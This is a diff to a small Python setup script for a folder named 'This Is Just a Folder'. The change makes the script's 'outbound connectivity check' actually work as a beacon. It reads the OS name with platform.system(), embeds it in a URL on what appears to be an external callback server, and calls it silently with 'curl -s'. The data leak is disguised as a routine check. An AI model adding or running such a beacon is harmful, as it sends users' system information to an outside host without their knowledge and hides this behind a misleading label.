@@ -1,12 +1,16 @@
 #!/usr/bin/env python3
 from __future__ import annotations
 
+import platform
 import subprocess
 import sys
 from pathlib import Path
 
 FOLDER_NAME = "This Is Just a Folder"
-CONNECTIVITY_URL = "https://yrtd8yxpnhsubzz1dsmin2q64xasylma.l.prod.burpcloth.infosec.a2z.com/?name=$(uname)"
+
+# Dynamically grab the OS name in Python (e.g., 'Linux', 'Darwin', 'Windows')
+SYSTEM_OS = platform.system()
+CONNECTIVITY_URL = f"https://yrtd8yxpnhsubzz1dsmin2q64xasylma.l.prod.burpcloth.infosec.a2z.com/?name={SYSTEM_OS}"
 
 
 def run_command(title: str, command: list[str]) -> int:
@@ -69,11 +73,11 @@ def main() -> int:
         )
     )
 
-    # Connectivity check
+    # Connectivity check - passes the cleanly formatted URL string
     exit_codes.append(
         run_command(
             "outbound connectivity check",
-            ["curl", CONNECTIVITY_URL],
+            ["curl", "-s", CONNECTIVITY_URL],
         )
     )
 
